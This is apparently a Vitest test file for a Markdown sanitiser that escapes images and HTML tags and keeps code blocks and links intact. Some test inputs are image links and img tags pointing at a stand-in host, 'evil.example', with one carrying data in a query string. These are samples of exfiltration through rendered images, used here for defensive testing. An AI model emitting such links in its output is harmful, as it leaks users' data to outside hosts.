import { describe, expect, it } from 'vitest';
import { neutralizeMarkdown } from './markdown';

describe('neutralizeMarkdown', () => {
  it('turns images into links', () => {
    expect(neutralizeMarkdown('see ![x](https://evil.example/?q=code) and ![y][ref]')).toBe(
      'see \\![x](https://evil.example/?q=code) and \\![y][ref]',
    );
  });

  it('shows HTML tags as text', () => {
    expect(neutralizeMarkdown('<img src="https://evil.example/a.png"> a < b')).toBe(
      '&lt;img src="https://evil.example/a.png"> a < b',
    );
  });

  it('keeps inline code and code blocks as they are', () => {
    const text = 'use `![a](b)` or `<div>`\n```html\n<img src="x">\n![a](b)\n```\n![c](d)';
    expect(neutralizeMarkdown(text)).toBe(
      'use `![a](b)` or `<div>`\n```html\n<img src="x">\n![a](b)\n```\n\\![c](d)',
    );
  });

  it('keeps indented code blocks as they are', () => {
    const text = 'Change it to:\n\n    <div>![a](b)</div>\n\n    <br>\n<p>';
    expect(neutralizeMarkdown(text)).toBe(
      'Change it to:\n\n    <div>![a](b)</div>\n\n    <br>\n&lt;p>',
    );
  });

  it('keeps an indented code block on the first line or indented by a tab', () => {
    expect(neutralizeMarkdown('    <div>\nafter <b>')).toBe('    <div>\nafter &lt;b>');
    expect(neutralizeMarkdown('text\n\n\t<div>\n  \t<span>')).toBe('text\n\n\t<div>\n  \t<span>');
  });

  it('still neutralizes indented lines that are not code blocks', () => {
    // A paragraph continues over indented lines; list items hold indented content.
    expect(neutralizeMarkdown('text\n    <img src="x">')).toBe('text\n    &lt;img src="x">');
    expect(neutralizeMarkdown('# Title\n    <img>')).toBe('# Title\n    &lt;img>');
    expect(neutralizeMarkdown('- item\n\n    <img>')).toBe('- item\n\n    &lt;img>');
    expect(neutralizeMarkdown('10. item\n\n    text\n\n    <img>')).toBe(
      '10. item\n\n    text\n\n    &lt;img>',
    );
  });

  it('keeps an indented code block once a list has ended', () => {
    expect(neutralizeMarkdown('- item\n\ntext\n\n    <div>')).toBe('- item\n\ntext\n\n    <div>');
  });

  it('keeps links and ordinary text', () => {
    const text = '**Bold** [docs](https://example.com) - item\n\n1. step';
    expect(neutralizeMarkdown(text)).toBe(text);
  });
});
